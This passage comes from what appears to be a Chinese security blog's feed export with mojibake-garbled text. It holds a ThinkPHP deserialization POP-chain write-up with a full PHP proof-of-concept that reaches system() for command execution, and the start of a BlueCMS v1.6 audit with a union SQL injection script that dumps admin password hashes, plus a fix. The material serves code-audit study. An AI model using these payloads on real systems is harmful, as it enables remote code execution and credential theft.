class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨isAjaxå‡½æ•°ä¸­ï¼Œ<code>$this-&gt;config[&#39;var_ajax&#39;]</code>å¯æ§ï¼Œç›¸å½“äºparamå‡½æ•°ä¸­<code>$name</code>å¯æ§ï¼Œå†ç›¸å½“äºinputå‡½æ•°ä¸­<code>$name</code>å¯æ§</p><p>è®©<code>$this-&gt;config[&#39;var_ajax&#39;]</code>ä¸ºç©ºï¼Œå³inputå‡½æ•°ä¸­<code>$name</code>ä¸ºç©ºï¼ŒåŠ ä¸Š<code>$data</code>å¯æ§ï¼Œæ•…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå›è°ƒå‡½æ•°ä¸­çš„å‚æ•°å¯æ§</p><p>è¿›è€ŒfilterValueä¸­çš„<code>$value = call_user_func($filter, $value);</code>ï¼Œå…¶å›è°ƒå‡½æ•°å’Œå‚æ•°ä¹Ÿéƒ½å¯æ§äº†</p><h1 id="åˆ©ç”¨é“¾æ¢³ç†"><a href="#åˆ©ç”¨é“¾æ¢³ç†" class="headerlink" title="åˆ©ç”¨é“¾æ¢³ç†"></a>åˆ©ç”¨é“¾æ¢³ç†</h1><p>popåˆ©ç”¨é“¾ï¼š</p><p>Windowsç±»çš„__destruct()â†’</p><p>Windowsç±»çš„removeFiles()â†’</p><p>file_exists()â†’</p><p>Modelç±»çš„__toString()â†’</p><p>Modelç±»çš„toJson()â†’</p><p>Modelç±»çš„toArray()â†’</p><p>Requestç±»çš„__call()â†’</p><p>Requestç±»çš„filterValue()â†’</p><p>Requestç±»çš„input()â†’</p><p>Requestç±»çš„param()â†’</p><p>Requestç±»çš„isAjax()</p><h1 id="POCæ¢³ç†"><a href="#POCæ¢³ç†" class="headerlink" title="POCæ¢³ç†"></a>POCæ¢³ç†</h1><p>POCï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files[]=<span class="keyword">new</span> Pivot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;cmd&#x27;</span>=&gt;<span class="keyword">new</span> Request()</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;cmd&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// è¡¨å•pjaxä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// å…¼å®¹PATH_INFOè·å–</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPSä»£ç†æ ‡è¯†</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IPä»£ç†è·å–æ ‡è¯†</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URLä¼ªé™æ€åç¼€</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>åˆ›å»ºä¸€ä¸ªWindows()å¯¹è±¡ï¼Œè§¦å‘Windowsç±»çš„<code>__construct()</code>æ–¹æ³•</p></li><li><p>ä¸Šä¸€æ­¥çš„<code>__construct()</code>æ–¹æ³•ä¸­åˆ›å»ºäº†ä¸€ä¸ªPivot()å¯¹è±¡ï¼Œå®ƒç»§æ‰¿è‡ªModel()ç±»ï¼Œè§¦å‘Model()ç±»çš„<code>__construct()</code>æ–¹æ³•</p></li><li><p>ä¸Šä¸€æ­¥çš„<code>__construct()</code>æ–¹æ³•ä¸­åˆ›å»ºäº†ä¸€ä¸ªRequest()å¯¹è±¡ï¼Œè§¦å‘Requestç±»çš„<code>__construct()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line"> <span class="keyword">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¸€æ­¥çš„<code>__construct()</code>æ–¹æ³•è°ƒç”¨äº†Requestç±»ä¸­ä¸å­˜åœ¨çš„visible()æ–¹æ³•ï¼Œè§¦å‘<code>__call()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span></span><br><span class="line">//$methodä¸ºä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œ$argsä¸ºä¸å­˜åœ¨æ–¹æ³•ä»¥æ•°ç»„å½¢å¼å­˜çš„å‚æ•°ï¼Œ</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (array_key_exists(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">    array_unshift(<span class="variable">$args</span>, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        <span class="comment">//æ‰§è¡Œ[$this,&#x27;isAjax&#x27;]</span></span><br><span class="line">   &#125;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>__call()</code>æ–¹æ³•ä¸­æ‰§è¡Œ<code>call_user_func_array()</code>æ–¹æ³•</p></li><li><p>æ‰§è¡Œå›è°ƒå‡½æ•°isAjax()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">        <span class="variable">$result</span>= <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œparam()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......       </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    <span class="comment">//$this-&gt;paramä»¥getæ–¹æ³•æäº¤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œinput()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            <span class="comment">//$dataç›¸å½“äº$this-&gt;param,$filterä¸ºsystem</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>æ‰§è¡ŒfilterValue()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> .......</span><br><span class="line">    <span class="variable">$value</span> = call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">    <span class="comment">//$filterä¸ºsystemï¼Œ$valueå³$data</span></span><br></pre></td></tr></table></figure><h1 id="éªŒè¯POC"><a href="#éªŒè¯POC" class="headerlink" title="éªŒè¯POC"></a>éªŒè¯POC</h1></li></ol><p>é¦–å…ˆæ„é€ ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œè¿™ä¸ªæ¼æ´å°±æ˜¯éœ€è¦åæœŸå¼€å‘çš„æ—¶å€™æœ‰åˆ©ç”¨ç‚¹ï¼Œæ‰èƒ½è§¦å‘</p><p>/public/index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Container::get(<span class="string">&#x27;app&#x27;</span>)-&gt;run()-&gt;send();</span><br><span class="line"><span class="variable">$str</span> = base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">unserialize(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p>æŠŠpayloadé€šè¿‡POSTä¼ è¿‡å»ï¼Œç„¶åé€šè¿‡GETè¯·æ±‚è·å–éœ€è¦æ‰§è¡Œçš„å‘½ä»¤</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210906171047508.png" alt="image-20210906171047508"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12639659.html#autoid-0-5-0">https://www.cnblogs.com/wangtanzhi/p/12639659.html#autoid-0-5-0</a></p><p><a href="https://paper.seebug.org/1040/#_2">https://paper.seebug.org/1040/#_2</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113843768">https://blog.csdn.net/rfrder/article/details/113843768</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bluecms v1.6å®¡è®¡</title>
      <link href="posts/56705.html"/>
      <url>posts/56705.html</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><ul><li><p>bluecms v1.6æºç </p><p><a href="https://github.com/source-trace/bluecms">https://github.com/source-trace/bluecms</a></p></li><li><p>Seayæºä»£ç å®¡è®¡ç³»ç»Ÿ </p><p>é“¾æ¥ï¼š<a href="http://pan.baidu.com/s/1dENS4KT#rszt">http://pan.baidu.com/s/1dENS4KT</a> å¯†ç ï¼šrszt</p></li><li><p>phpStudy2018 PHP-5.4.45</p></li></ul><p>æŒ‰ç†è¯´è®¿é—®ç½‘ç«™ä¸»ç›®å½•ä¸‹çš„<code>/install</code>å°±èƒ½è¿›å…¥å®‰è£…é¡µé¢ï¼Œä½†æˆ‘è®¿é—®åå´æ˜¾ç¤ºç©ºç™½ï¼Œæ— æ³•è¿›è¡Œå®‰è£…ã€‚ç»è¿‡æœç´¢ï¼Œæ‰¾åˆ°äº†è§£å†³åŠæ³•ï¼šåœ¨phpstudyè®¾ç½®ä¸­æ‰“å¼€å…è®¸ç›®å½•åˆ—è¡¨ï¼Œå¹¶ä¸”åœ¨ <code>\install\compile</code> ç›®å½•ä¸‹åˆ æ‰<code>%%37^37A^37A968E3%%step1.htm.php</code>æ–‡ä»¶ï¼Œå†è®¿é—®ä¸€æ¬¡å®‰è£…åœ°å€å°±å¯ä»¥äº†ã€‚æ¥ä¸‹æ¥æŒ‰ç…§æç¤ºè¿›è¡Œæ•°æ®åº“é…ç½®å³å¯æˆåŠŸæ­å»ºã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818102132490.png" alt="image-20210818102132490"></p><h1 id="æ¼æ´å‘ç°"><a href="#æ¼æ´å‘ç°" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h1><p>Seayæºä»£ç å®¡è®¡ç³»ç»Ÿè‡ªåŠ¨å®¡è®¡ç»“æœ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818102733659.png" alt="image-20210818102733659"></p><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><h3 id="unionæ³¨å…¥"><a href="#unionæ³¨å…¥" class="headerlink" title="unionæ³¨å…¥"></a>unionæ³¨å…¥</h3><p><code>ad_js.php</code></p><p>å®šä½åˆ°è¿™é‡Œï¼Œå‘ç°<code>$_GET[&#39;ad_id&#39;]</code>å‚æ•°é™¤äº†trimå»æ‰ä¸¤è¾¹ç©ºæ ¼å¤–æ²¡æœ‰å…¶ä»–çš„è¿‡æ»¤ï¼Œè€ŒåŒ…å«çš„<code>common.inc.php</code>ä¸­å¯¹<code>$_GET</code>è¿›è¡Œäº†<code>addslashes</code>è¿‡æ»¤ï¼Œä½†ç”±äºSQLè¯­å¥ä¸­çš„å˜é‡æ²¡æœ‰ä½¿ç”¨å•å¼•å·ä¿æŠ¤ï¼Œ<code>addslashes</code> ä¹Ÿå°±å¤±å»äº†ä½œç”¨ï¼Œæ•…å­˜åœ¨sqlæ³¨å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$ad_id</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error!&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure><p>getoneå‡½æ•°ï¼Œæ‰§è¡Œä¼ å…¥çš„sqlè¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$type</span>=MYSQL_ASSOC</span>)</span>&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">$this</span>-&gt;query(<span class="variable">$sql</span>,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">   <span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, <span class="variable">$type</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹æäº¤çš„å‚æ•°è¿›è¡Œè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_POST</span> = install_deep_addslashes(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_GET</span> = install_deep_addslashes(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$_COOKIES</span> = install_deep_addslashes(<span class="variable">$_COOKIES</span>);</span><br><span class="line"><span class="variable">$_REQUEST</span> = install_deep_addslashes(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.47.128/bluecms/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.47.128/bluecms/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f61646d696e&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://192.168.47.128/bluecms/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x7e,pwd) from blue_admin&quot;</span></span><br><span class="line">result=requests.get(url=url).text</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;!--document.write(&quot;admin~21232f297a57a5a743894a0e4a801fc3&quot;);--&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿®å¤æ–¹å¼</p><p>æŠŠè¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ”¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? intval(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å‡½æ•°intvalï¼ˆï¼‰â€“&gt; è·å–å˜é‡çš„æ•´æ•°å€¼</p><h3 id="XFFå¤´æ³¨å…¥"><a href="#XFFå¤´æ³¨å…¥" class="headerlink" title="XFFå¤´æ³¨å…¥"></a>XFFå¤´æ³¨å…¥</h3><p>æ ¹æ®è‡ªåŠ¨å®¡è®¡ç»“æœï¼ŒæŸ¥çœ‹ä¸‹<code>/uploads/include/common.fun.php</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210818160617812.png" alt="image-20210818160617812"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">&#123; <span class="comment">//è·å–å®¢æˆ·ç«¯ç”¨ä»£ç†æœåŠ¡å™¨è®¿é—®æ—¶çš„çœŸå®ip åœ°å€</span></span><br><span class="line"><span class="variable">$ip</span> = getenv(<span 